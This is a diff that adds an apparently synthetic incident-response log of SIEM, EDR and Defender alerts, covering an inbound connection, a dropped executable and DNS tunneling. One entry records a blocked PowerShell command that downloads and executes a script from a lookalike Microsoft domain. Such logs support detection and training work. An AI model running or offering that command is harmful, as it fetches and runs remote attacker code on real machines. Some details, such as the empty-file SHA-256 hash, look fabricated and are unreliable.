@@ -1,0 +1,23 @@
+2026-06-09T14:22:01.402Z [SYS_ALERT] Inbound connection handshake initiated from external perimeter.
+Source_IP: 185.220.101.5
+Target_Internal_IP: 192.168.1.50
+Protocol: TCP/443 (HTTPS)
+Status: ESTABLISHED
+
+2026-06-09T14:23:15.118Z [HOST_DFIR] Windows Defender Exploit Guard detected unauthorized PowerShell invocation payload.
+Process_ID: 4108
+Command_Line: "powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://update.microsoft-security-verify.com/updates.ps1'))""
+Action: BLOCKED
+Threat_Signature: Trojan:PowerShell/Meterpreter.A
+
+2026-06-09T14:25:40.002Z [EDR_AGENT] Local file system integrity scan identified unverified executable footprint dropping in AppData\Local\Temp.
+File_Name: svchost_patch.exe
+MD5_Hash: ed97d402ca8b0051877685652611e92d
+SHA-256_Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+Status: QUARANTINED
+
+2026-06-09T14:28:11.990Z [NET_SIEM] DNS Tunneling telemetry flag tripped. Unusual high-frequency TXT record queries resolved.
+Requested_Domain: tracking.cobaltstriker.org
+Resolver_IP: 127.0.0.1
+Total_Queries_5m: 1420
+Action: Flagged for Active Analyst Ingestion
